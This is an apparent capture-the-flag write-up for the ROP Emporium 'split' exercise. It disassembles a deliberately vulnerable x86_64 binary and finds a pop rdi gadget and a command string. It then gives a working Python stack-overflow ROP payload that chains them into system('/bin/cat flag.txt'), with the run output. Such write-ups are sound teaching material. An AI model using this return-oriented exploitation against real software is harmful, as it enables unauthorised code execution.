# split
**Provided materials:** A `split` binary and a `flag.txt` file

**Directions:** I'll let you in on a secret: that useful string `"/bin/cat flag.txt"` is still present in this binary, as is a call to `system()`. It's just a case of finding them and chaining them together to make the magic happen.

The included `split` binary asks us to enter some input into an array on the stack. After providing something, the program thanks us and exits.
```
$ ./split
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> hey
Thank you!

Exiting
```

I started by debugging the binary with GDB. The `main` function calls `pwnme()`, which again uses `read()` to save user input somewhere on the stack.
```
gef➤  disas pwnme
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:	push   rbp
   0x00000000004006e9 <+1>:	mov    rbp,rsp
   0x00000000004006ec <+4>:	sub    rsp,0x20
   0x00000000004006f0 <+8>:	lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:	mov    edx,0x20
   0x00000000004006f9 <+17>:	mov    esi,0x0
   0x00000000004006fe <+22>:	mov    rdi,rax
   0x0000000000400701 <+25>:	call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:	mov    edi,0x400810
   0x000000000040070b <+35>:	call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:	mov    edi,0x40083c
   0x0000000000400715 <+45>:	mov    eax,0x0
   0x000000000040071a <+50>:	call   0x400570 <printf@plt>
   0x000000000040071f <+55>:	lea    rax,[rbp-0x20]
   0x0000000000400723 <+59>:	mov    edx,0x60
   0x0000000000400728 <+64>:	mov    rsi,rax
   0x000000000040072b <+67>:	mov    edi,0x0
   0x0000000000400730 <+72>:	call   0x400590 <read@plt>
   0x0000000000400735 <+77>:	mov    edi,0x40083f
   0x000000000040073a <+82>:	call   0x400550 <puts@plt>
   0x000000000040073f <+87>:	nop
   0x0000000000400740 <+88>:	leave
   0x0000000000400741 <+89>:	ret
End of assembler dump.
```
In this case, up to `0x60` (96) bytes are read from the keyboard before the program exits. I already know that the payload needs 40 bytes of padding before the saved return address.

Viewing the available functions shows an unused `usefulFunction` starting at `0x400742`.
```
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000400528  _init
0x0000000000400550  puts@plt
0x0000000000400560  system@plt
0x0000000000400570  printf@plt
0x0000000000400580  memset@plt
0x0000000000400590  read@plt
0x00000000004005a0  setvbuf@plt
0x00000000004005b0  _start
0x00000000004005e0  _dl_relocate_static_pie
0x00000000004005f0  deregister_tm_clones
0x0000000000400620  register_tm_clones
0x0000000000400660  __do_global_dtors_aux
0x0000000000400690  frame_dummy
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400742  usefulFunction
0x0000000000400760  __libc_csu_init
0x00000000004007d0  __libc_csu_fini
0x00000000004007d4  _fini
```

Upon disassembling, it calls `system()` with a pre-set argument.
```
gef➤  disas usefulFunction 
Dump of assembler code for function usefulFunction:
   0x0000000000400742 <+0>:	push   rbp
   0x0000000000400743 <+1>:	mov    rbp,rsp
   0x0000000000400746 <+4>:	mov    edi,0x40084a
   0x000000000040074b <+9>:	call   0x400560 <system@plt>
   0x0000000000400750 <+14>:	nop
   0x0000000000400751 <+15>:	pop    rbp
   0x0000000000400752 <+16>:	ret
End of assembler dump.
```

I now have a direct call to `system()`, but the string at `0x40084a` reads `"/bin/ls"`. The payload requires another gadget to correctly set the first argument of `system()` to the string `"/bin/cat flag.txt"`. The `split` binary does not contain a function to directly set the `rdi` register to any value of choice. However, I can locate a gadget to do so with tools such as `ropper`.

After loading the binary with `ropper` and searching for a `pop rdi` gadget, we find a match at address `0x4007c3`! In particular, `pop rdi` allows me to set the register to any value I want, such as the string `"/bin/cat flag.txt"`.
```
$ ropper
(ropper)> file split
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] File loaded.
(split/ELF/x86_64)> search pop rdi
[INFO] Searching for gadgets: pop rdi

[INFO] File: split
0x00000000004007c3: pop rdi; ret; 

(split/ELF/x86_64)>
```

`Objdump` proved useful in locating the correct string. Register `rdi` needs to store `0x601060` for `system()` to print the flag.
```
$ objdump -s -j .data split

split:     file format elf64-x86-64

Contents of section .data:
 601050 00000000 00000000 00000000 00000000  ................
 601060 2f62696e 2f636174 20666c61 672e7478  /bin/cat flag.tx
 601070 7400                                 t."
```

Armed with the necessary gadgets, I constructed the payload used to print the flag (shown below).
```python
set_rdi_gadget = 0x4007c3
command_str = 0x601060
call_system_gadget = 0x40074b

payload = b"A"*40 
payload += p64(set_rdi_gadget) + p64(command_str)
payload += p64(call_system_gadget)
```

When `split` reads the payload via `read()`, the return address for `pwnme()` is redirected to the `pop rdi` instruction found by `ropper`. The address `0x601060` (pointer to `"/bin/cat flag.txt"`) is popped off the stack into the `rdi` register. The program then returns directly to the call to `system()` and executes `system("/bin/cat flag.txt")` to print the flag!
```
$ python3 solution.py 
[+] Starting local process './split': pid 17651
[*] Switching to interactive mode
split by ROP Emporium
x86_64

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
$ 
[*] Process './split' stopped with exit code -11 (SIGSEGV) (pid 17651)
[*] Got EOF while sending in interactive
```

The program eventually segfaults as a side effect of the memory corruption, but the goal has been accomplished.
